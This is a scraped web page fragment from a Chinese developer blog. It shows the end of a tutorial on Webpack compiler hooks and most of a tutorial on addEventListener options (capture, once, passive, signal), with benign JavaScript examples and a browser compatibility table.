<li>
<p><strong><code>afterPlugins</code></strong></p>
<ul>
<li><strong>类型</strong>：SyncHook</li>
<li><strong>作用</strong>：所有插件的 <code>apply</code> 方法执行完之后。适合做插件之间的联动检查。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">2. 编译构建阶段 (Running &amp; Building)</h3>
<p>这是工厂开始运转，处理模块依赖的核心阶段。</p>
<ul>
<li>
<p><strong><code>run</code></strong></p>
<ul>
<li><strong>类型</strong>：AsyncSeriesHook</li>
<li><strong>作用</strong>：构建真正开始前的“预热”阶段。可以用于清理缓存或读取外部记录。</li>
</ul>
</li>
<li>
<p><strong><code>compile</code></strong></p>
<ul>
<li><strong>类型</strong>：SyncHook</li>
<li><strong>作用</strong>：告诉大家“我要开始创建编译对象了”。</li>
</ul>
</li>
<li>
<p><strong><code>compilation</code> (⭐ 核心中的核心)</strong></p>
<ul>
<li><strong>类型</strong>：SyncHook</li>
<li><strong>作用</strong>：<code>compilation</code> 对象创建完成。</li>
<li><strong>详解</strong>：这是绝大多数插件的入口。<code>compilation</code> 代表**“仅仅这一次构建”**的资源集合。在这里，你可以通过访问 <code>compilation.hooks</code> 进一步深入到模块（Module）和代码块（Chunk）的处理细节中。</li>
</ul>
</li>
<li>
<p><strong><code>make</code></strong></p>
<ul>
<li><strong>类型</strong>：AsyncParallelHook</li>
<li><strong>作用</strong>：编译过程正式启动，开始从 Entry 递归分析依赖。这是添加额外文件或模块的好时机。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">3. 输出阶段 (Output)</h3>
<p>资源已经处理完毕，准备打包生成的阶段。</p>
<ul>
<li>
<p><strong><code>emit</code> (⭐ 最常用)</strong></p>
<ul>
<li><strong>类型</strong>：AsyncSeriesHook</li>
<li><strong>作用</strong>：资源已经转换完成，放在内存里，但<strong>还没写入磁盘</strong>。</li>
<li><strong>实战</strong>：这是修改最终输出文件的最后机会。比如：生成 <code>file-list.md</code>、压缩图片、添加版权头信息等。</li>
</ul>
</li>
<li>
<p><strong><code>afterEmit</code></strong></p>
<ul>
<li><strong>类型</strong>：AsyncSeriesHook</li>
<li><strong>作用</strong>：文件已经写入磁盘之后。常用于清理临时文件。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">4. 结束阶段 (Termination)</h3>
<ul>
<li>
<p><strong><code>done</code></strong></p>
<ul>
<li><strong>类型</strong>：AsyncSeriesHook</li>
<li><strong>作用</strong>：构建完成（无论成功还是有警告）。常用于打印统计信息（Stats）或发送构建完成通知。</li>
</ul>
</li>
<li>
<p><strong><code>failed</code></strong></p>
<ul>
<li><strong>类型</strong>：SyncHook</li>
<li><strong>作用</strong>：构建因错误而失败。用于错误上报。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-6">三、 实战：如何“挂载”你的逻辑？</h2>
<p>在插件类的 <code>apply</code> 方法中，我们使用 <code>.tap</code> 系列方法来注册钩子。根据钩子的类型（同步或异步），有不同的写法。</p>
<h3 data-id="heading-7">1. 同步钩子 (SyncHook)</h3>
<p>使用 <code>.tap()</code>。逻辑执行完，流水线继续。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyStartPlugin</span> {
  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) {
    <span class="hljs-comment">// 参数1: 插件名称（建议写类名），参数2: 回调</span>
    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">compile</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">'MyStartPlugin'</span>, <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'&gt;&gt;&gt; 编译器启动，准备干活！'</span>);
    });
  }
}
</code></pre>
<h3 data-id="heading-8">2. 异步钩子 (AsyncHook)</h3>
<p>类似于 <code>emit</code> 这种涉及文件 I/O 的操作，通常是异步的。你有两种选择：</p>
<p>方式 A：回调风格 (tapAsync)</p>
<p>注意：千万别忘了调用 callback()，否则构建会卡死！</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileListPlugin</span> {
  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) {
    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">'FileListPlugin'</span>, <span class="hljs-function">(<span class="hljs-params">compilation, callback</span>) =&gt;</span> {
      <span class="hljs-comment">// 1. 读取当前生成的所有资源名称</span>
      <span class="hljs-keyword">const</span> fileNames = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(compilation.<span class="hljs-property">assets</span>);
      <span class="hljs-keyword">const</span> content = <span class="hljs-string">`Generated files:\n <span class="hljs-subst">${fileNames.join(<span class="hljs-string">'\n'</span>)}</span>`</span>;

      <span class="hljs-comment">// 2. 向输出列表中添加一个新的文件</span>
      compilation.<span class="hljs-property">assets</span>[<span class="hljs-string">'file-list.txt'</span>] = {
        <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> content,
        <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> content.<span class="hljs-property">length</span>
      };

      <span class="hljs-comment">// 3. 通知 Webpack 继续</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'文件列表已生成'</span>);
      <span class="hljs-title function_">callback</span>(); 
    });
  }
}
</code></pre>
<p>方式 B：Promise 风格 (tapPromise)</p>
<p>返回一个 Promise，Webpack 会等待它 resolve。</p>
<pre><code class="hljs language-javascript" lang="javascript">compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapPromise</span>(<span class="hljs-string">'MyPromisePlugin'</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'异步任务完成'</span>);
      <span class="hljs-title function_">resolve</span>();
    }, <span class="hljs-number">1000</span>);
  });
});
</code></pre>
<hr/>
<h2 data-id="heading-9">四、 避坑指南：Compiler vs Compilation</h2>
<p>初学者最大的困惑往往是： <strong>“我到底该用 <code>compiler.hooks</code> 还是 <code>compilation.hooks</code>？”</strong></p>























<table><thead><tr><th><strong>对象</strong></th><th><strong>作用域</strong></th><th><strong>关注点</strong></th><th><strong>举例</strong></th></tr></thead><tbody><tr><td><strong>Compiler</strong></td><td><strong>宏观</strong> (整个生命周期)</td><td>构建的起止、配置、环境</td><td>“什么时候开始跑？”、“什么时候写完文件？”</td></tr><tr><td><strong>Compilation</strong></td><td><strong>微观</strong> (单次构建)</td><td>具体的模块、依赖、代码生成</td><td>“如何压缩这个 JS？”、“这个 CSS 的 Hash 怎么算？”</td></tr></tbody></table>
<p>使用原则：</p>
<p>一般我们通过 compiler.hooks.compilation 作为入口，拿到 compilation 实例，然后再去注册 compilation.hooks 来处理具体的资源。</p>
<pre><code class="hljs language-javascript" lang="javascript">compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">compilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">'MyPlugin'</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> {
  <span class="hljs-comment">// 现在你可以操作具体的模块钩子了</span>
  compilation.<span class="hljs-property">hooks</span>.<span class="hljs-property">optimizeChunkAssets</span>.<span class="hljs-title function_">tap</span>(...)
});
</code></pre>
<h2 data-id="heading-10">总结</h2>
<p>掌握 <code>compiler.hooks</code> 是通往 Webpack 高级玩法的必经之路。</p>
<ol>
<li><strong>EntryOption/Run</strong>: 配置与预处理。</li>
<li><strong>Compilation</strong>: 深入模块处理的入口。</li>
<li><strong>Emit</strong>: 修改最终产物的最后机会（最常用）。</li>
<li><strong>Done</strong>: 统计与通知。</li>
</ol>
<p>理解了这条流水线，你就拥有了随意定制前端构建流程的能力。 Happy Coding!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[巧妙浏览器事件监听API：addEventListener的第三个参数]]></title>    <link>https://juejin.cn/post/7575735719076249606</link>    <guid>https://juejin.cn/post/7575735719076249606</guid>    <pubDate>2025-11-24T02:43:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575735719076249606" data-draft-id="7575937594339213353" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="巧妙浏览器事件监听API：addEventListener的第三个参数"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T02:43:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="X_hope"/> <meta itemprop="url" content="https://juejin.cn/user/4365481627355447"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            巧妙浏览器事件监听API：addEventListener的第三个参数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4365481627355447/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    X_hope
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:43:36.000Z" title="Mon Nov 24 2025 02:43:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在前端开发中，<code>addEventListener</code> 是我们绑定事件监听器的"老朋友"。大多数时候，我们习惯只传入前两个参数——事件类型和回调函数，却常常忽略第三个参数的强大能力。这个看似"可选"的参数，在现代浏览器的API升级中早已进化成优化性能、简化逻辑的关键工具。本文就带你吃透它的两种形态与最新用法，让事件处理更优雅高效。</p>
<h3 data-id="heading-1">一、从布尔值到配置对象：第三个参数的进化之路</h3>
<p>早期的 <code>addEventListener</code> 第三个参数仅支持布尔值（命名为 <code>useCapture</code>），用于控制事件监听器在"捕获阶段"还是"冒泡阶段"触发。随着Web标准的发展，现代浏览器（包括Chrome 49+、Firefox 48+等）已全面支持传入<strong>配置对象</strong>，除了实现捕获控制，还扩展了诸多实用特性。</p>
<p>当前最新API规范中，第三个参数的完整定义为：可选参数，可传入布尔值或包含 <code>capture</code>、<code>once</code>、<code>passive</code>、<code>signal</code> 属性的配置对象，用于精确控制事件监听行为。</p>
<h3 data-id="heading-2">二、核心参数详解：每个特性都藏着实用技巧</h3>
<p>无论是布尔值形式还是配置对象形式，核心能力都围绕事件传播机制与监听器生命周期展开。下面结合最新API特性与实战场景逐一解析。</p>
<h4 data-id="heading-3">1. capture：控制事件触发的"阶段"</h4>
<p>这是第三个参数最基础的能力，对应早期布尔值用法的核心功能。事件在DOM中传播分为三个阶段：捕获阶段（从根元素到目标元素）、目标阶段（事件到达目标元素）、冒泡阶段（从目标元素回退到根元素）。</p>
<ul>
<li><strong>capture: false</strong>（默认）：监听器在<strong>冒泡阶段</strong>触发，适合大多数场景，能让事件自然向上传播</li>
<li><strong>capture: true</strong>：监听器在<strong>捕获阶段</strong>触发，可实现"提前拦截"事件的效果</li>
</ul>
<p><strong>实战场景：点击遮罩关闭弹窗</strong>，通过捕获阶段提前拦截事件，避免事件冒泡到弹窗内部元素时被干扰：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> mask = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'mask'</span>);
<span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'modal'</span>);

<span class="hljs-comment">// 捕获阶段监听遮罩点击，优先触发</span>
mask.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  modal.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
}, { <span class="hljs-attr">capture</span>: <span class="hljs-literal">true</span> });

<span class="hljs-comment">// 冒泡阶段监听弹窗内容点击，不会被遮罩的捕获监听干扰</span>
modal.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// 阻止事件继续冒泡到遮罩</span>
});
</code></pre>
<h4 data-id="heading-4">2. once：让监听器"自动离职"</h4>
<p>当 <code>once: true</code> 时，监听器在第一次触发后会自动从元素上移除，无需手动调用 <code>removeEventListener</code>，特别适合一次性操作场景。</p>
<p><strong>实战场景：表单提交防重复点击</strong>，避免用户快速多次点击提交按钮导致重复请求：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">form</span> = document.getElementById(<span class="hljs-string">'myForm'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">submitBtn</span> = form.querySelector(<span class="hljs-string">'button[type="submit"]'</span>)<span class="hljs-comment">;</span>

form.addEventListener('submit', async (e) =&gt; {
  e.preventDefault()<span class="hljs-comment">;</span>
  <span class="hljs-attr">submitBtn.disabled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">; // 辅助禁用按钮</span>
  try {
    const <span class="hljs-attr">formData</span> = new FormData(form)<span class="hljs-comment">;</span>
    await fetch('/api/submit', { method: 'POST', body: formData })<span class="hljs-comment">;</span>
    alert('提交成功')<span class="hljs-comment">;</span>
  } catch (err) {
    alert('提交失败，请重试')<span class="hljs-comment">;</span>
    <span class="hljs-attr">submitBtn.disabled</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  }
}, { once: true })<span class="hljs-comment">; // 提交一次后自动移除监听器</span>
</code></pre>
<p>相比手动管理监听器，<code>once</code> 不仅简化代码，还能避免因逻辑遗漏导致的内存泄漏问题。</p>
<h4 data-id="heading-5">3. passive：拯救移动端滚动性能</h4>
<p>这是优化移动端体验的关键参数。当 <code>passive: true</code> 时，浏览器会提前知道监听器**<code>preventDefault()</code>** <strong>不会调用</strong> ，从而无需等待监听器执行完成就能立即响应滚动，彻底解决移动端滚动卡顿问题。</p>
<p><strong>适用场景</strong>：scroll、touchstart、wheel等与滚动相关的事件，目前主流浏览器已默认对部分事件开启passive，但显式声明更稳妥。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 移动端滚动监听优化</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> backToTop = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'backToTop'</span>);
  <span class="hljs-comment">// 滚动超过300px显示回到顶部按钮</span>
  backToTop.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> &gt; <span class="hljs-number">300</span> ? <span class="hljs-string">'block'</span> : <span class="hljs-string">'none'</span>;
}, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span> }); <span class="hljs-comment">// 明确声明不会阻止默认滚动</span>

<span class="hljs-comment">// 错误用法：passive为true时调用preventDefault会报错</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'touchmove'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// 控制台会抛出警告</span>
}, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span> });
</code></pre>
<h4 data-id="heading-6">4. signal：监听器的"批量管理开关"</h4>
<p>这是较新的API特性（2025年已被主流浏览器支持），通过传入 <code>AbortSignal</code> 对象，可实现对监听器的批量移除或条件性取消，尤其适合组件化开发中"组件卸载时清理监听器"的场景。</p>
<p><strong>实现原理</strong>：创建 <code>AbortController</code> 实例，其 <code>signal</code> 属性传入监听器配置，调用 <code>abort()</code> 方法即可触发所有关联监听器的移除。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建控制器实例</span>
<span class="hljs-keyword">const</span> abortController = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
<span class="hljs-keyword">const</span> { signal } = abortController;

<span class="hljs-comment">// 绑定多个监听器，共享同一个signal</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll, { signal });
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleResize, { signal });
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleClick, { signal });

<span class="hljs-comment">// 组件卸载时批量移除所有监听器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">destroyComponent</span>(<span class="hljs-params"/>) {
  abortController.<span class="hljs-title function_">abort</span>(); <span class="hljs-comment">// 一次调用，所有关联监听器失效</span>
}

<span class="hljs-comment">// 条件性取消：比如3秒后自动停止监听滚动</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  abortController.<span class="hljs-title function_">abort</span>(<span class="hljs-string">'自动取消监听'</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(signal.<span class="hljs-property">reason</span>); <span class="hljs-comment">// 输出"自动取消监听"</span>
}, <span class="hljs-number">3000</span>);
</code></pre>
<h3 data-id="heading-7">三、综合实战：打造高效的列表交互组件</h3>
<p>结合上述参数特性，我们实现一个"可编辑列表"组件，包含以下功能：点击列表项展开编辑框、编辑确认按钮仅生效一次、组件销毁时清理所有监听器、滚动时高亮当前可视区域列表项。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EditableList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">containerId</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(containerId);
    <span class="hljs-comment">// 创建监听器控制器</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">abortController</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }

  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. 事件委托监听列表项点击（捕获阶段优化性能）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-title function_">matches</span>(<span class="hljs-string">'.list-item'</span>)) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showEditBox</span>(e.<span class="hljs-property">target</span>);
      }
    }, { <span class="hljs-attr">capture</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">signal</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">abortController</span>.<span class="hljs-property">signal</span> });

    <span class="hljs-comment">// 2. 滚动监听：高亮可视区域列表项（passive优化滚动）</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">highlightVisibleItems</span>();
    }, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">signal</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">abortController</span>.<span class="hljs-property">signal</span> });
  }

  <span class="hljs-title function_">showEditBox</span>(<span class="hljs-params">item</span>) {
    <span class="hljs-keyword">const</span> editBox = item.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.edit-box'</span>);
    <span class="hljs-keyword">const</span> confirmBtn = editBox.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.confirm-btn'</span>);
    editBox.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'block'</span>;

    <span class="hljs-comment">// 3. 确认按钮仅生效一次（once自动移除监听器）</span>
    confirmBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> input = editBox.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'input'</span>);
      item.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.content'</span>).<span class="hljs-property">textContent</span> = input.<span class="hljs-property">value</span>;
      editBox.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
    }, { <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">signal</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">abortController</span>.<span class="hljs-property">signal</span> });
  }

  <span class="hljs-title function_">highlightVisibleItems</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 实现可视区域判断逻辑...</span>
  }

  <span class="hljs-comment">// 组件销毁：批量清理所有监听器</span>
  <span class="hljs-title function_">destroy</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">abortController</span>.<span class="hljs-title function_">abort</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">remove</span>();
  }
}

<span class="hljs-comment">// 使用组件</span>
<span class="hljs-keyword">const</span> list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EditableList</span>(<span class="hljs-string">'list-container'</span>);
<span class="hljs-comment">// 页面关闭或组件卸载时销毁</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> list.<span class="hljs-title function_">destroy</span>());
</code></pre>
<h3 data-id="heading-8">四、2025年最新兼容性与最佳实践</h3>
<h4 data-id="heading-9">1. 兼容性说明</h4>

































<table><thead><tr><th>参数特性</th><th>Chrome</th><th>Firefox</th><th>Safari</th><th>Edge</th></tr></thead><tbody><tr><td>capture（布尔值）</td><td>全版本</td><td>全版本</td><td>全版本</td><td>全版本</td></tr><tr><td>once/passive</td><td>49+</td><td>48+</td><td>10.1+</td><td>16+</td></tr><tr><td>signal</td><td>88+</td><td>91+</td><td>15.4+</td><td>88+</td></tr></tbody></table>
<p>对于需要兼容旧浏览器的场景，可通过 <code>eventListenerOptionsPassive</code> 等特性检测工具做降级处理。</p>
<h4 data-id="heading-10">2. 最佳实践总结</h4>
<ul>
<li>优先使用<strong>配置对象</strong>形式，替代传统布尔值，增强代码可读性</li>
<li>移动端滚动相关事件必加 <code>passive: true</code>，提升滚动流畅度</li>
<li>一次性操作（如表单提交、引导弹窗）用 <code>once: true</code>，简化监听器管理</li>
<li>组件化开发中，用 <code>signal</code> 实现监听器批量清理，避免内存泄漏</li>
<li>事件委托场景中，合理利用 <code>capture</code> 阶段优化事件响应顺序</li>
</ul>
<h3 data-id="heading-11">五、结语</h3>
